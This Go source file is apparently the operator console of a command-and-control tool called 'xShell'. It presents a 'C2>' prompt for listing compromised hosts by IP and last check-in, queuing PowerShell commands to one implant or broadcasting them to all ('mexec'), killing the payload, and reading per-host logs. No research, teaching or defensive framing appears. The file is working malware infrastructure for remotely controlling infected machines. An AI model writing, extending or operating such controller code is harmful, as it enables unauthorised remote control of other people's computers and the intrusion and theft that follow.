package internal

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
	"sort"
	"strings"
	"time"

	"github.com/chzyer/readline"
)

var CurrentShell *Shell

var helpMenu string = `
xShell v0.2 (2023-08-31)
-------------------------------------------
Main Menu Commands:
Command                  Description
-------------------------------------------
shells                   List all active shells
shell <shell_name>       Interact with a specific shell
mexec <command>          Execute command on all active shells
clear                    Clear the console
help                     Show this menu
exit                     Exit shell interaction, return to main menu
quit                     Quit xShell
-------------------------------------------
Shell Interaction Commands:
Command                  Description
-------------------------------------------
exec <command>           Run command (defaults to powershell)
whoami                   Run "whoami" (powershell)
kill                     Kills payload process
-------------------------------------------
`

func StartCLI() {
	autoCompleter := readline.NewPrefixCompleter(
		readline.PcItem("shells"),
		readline.PcItem("shell"),
		readline.PcItem("mexec"),
		readline.PcItem("clear"),
		readline.PcItem("help"),
		readline.PcItem("exit"),
		readline.PcItem("whoami"),
		readline.PcItem("kill"),
		readline.PcItem("quit"),
	)
	l, err := readline.NewEx(&readline.Config{
		Prompt:          "C2> ",
		AutoComplete:    autoCompleter,
		InterruptPrompt: "^C",
		EOFPrompt:       "quit",
	})
	if err != nil {
		fmt.Printf("Error initializing readline: %v\n", err)
		return
	}
	defer l.Close()
	historyFile, err := os.OpenFile(".history", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Printf("Error opening history file: %v\n", err)
		return
	}
	defer historyFile.Close()
	for {
		command, err := l.Readline()
		if err != nil {
			break
		}
		if _, err := historyFile.WriteString(command + "\n"); err != nil {
			fmt.Printf("Failed to write to history file: %s\n", err)
		}
		command = strings.TrimSpace(command)
		if CurrentShell != nil {
			l.SetPrompt(fmt.Sprintf("xShell %s> ", CurrentShell.Id))
		} else {
			l.SetPrompt("C2> ")
		}
		if command == "quit" {
			os.Exit(0)
		} else if command == "clear" {
			if err := clearConsole(); err != nil {
				fmt.Printf("Failed to clear console: %s\n", err)
			}
		} else if strings.HasPrefix(command, "mexec ") {
			if shells, err := ShellMap.GetAll(); shells != nil && err == nil {
				cmd := strings.TrimPrefix(command, "mexec ")
				for _, shell := range shells {
					shell.Cmds = append(shell.Cmds, cmd)
				}
			} else {
				fmt.Println("No Active Shells")
			}
		} else if command == "shells" {
			shells, err := ShellMap.GetAll()
			if err != nil {
				fmt.Println("No Active Shells")
				continue
			}
			sort.Slice(shells, func(i, j int) bool {
				return shells[i].Id < shells[j].Id
			})
			for _, shell := range shells {
				fmt.Printf("ID: %s, IP: %s Last Call: %.0f seconds ago\n", shell.Id, shell.Ip, time.Duration(time.Since(shell.LCall)).Seconds())
			}
		} else if command == "help" {
			fmt.Print(helpMenu)
		} else if strings.HasPrefix(command, "shell ") {
			id := strings.TrimPrefix(command, "shell ")
			if shell, err := ShellMap.Get(id); shell != nil && err == nil {
				CurrentShell = shell
				filePath := fmt.Sprintf("c2/data/%s.log", id)
				data, err := os.ReadFile(filePath)
				if err != nil {
					fmt.Printf("%s\n", err)
				} else {
					fmt.Printf("%s\n", string(data))
				}
				l.SetPrompt(fmt.Sprintf("xShell %s> ", CurrentShell.Id))
			} else if err == nil {
				fmt.Printf("No shell with ID %s\n", id)
			} else {
				fmt.Printf("Error interacting with shell %s\n", err.Error())
			}
		} else if command == "exit" {
			CurrentShell = nil
		} else if CurrentShell != nil {
			CurrentShell.Cmds = append(CurrentShell.Cmds, command)
		} else {
			fmt.Println("Unknown command")
		}
	}
}

func clearConsole() error {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	} else {
		cmd = exec.Command("clear")
	}
	cmd.Stdout = os.Stdout
	return cmd.Run()
}
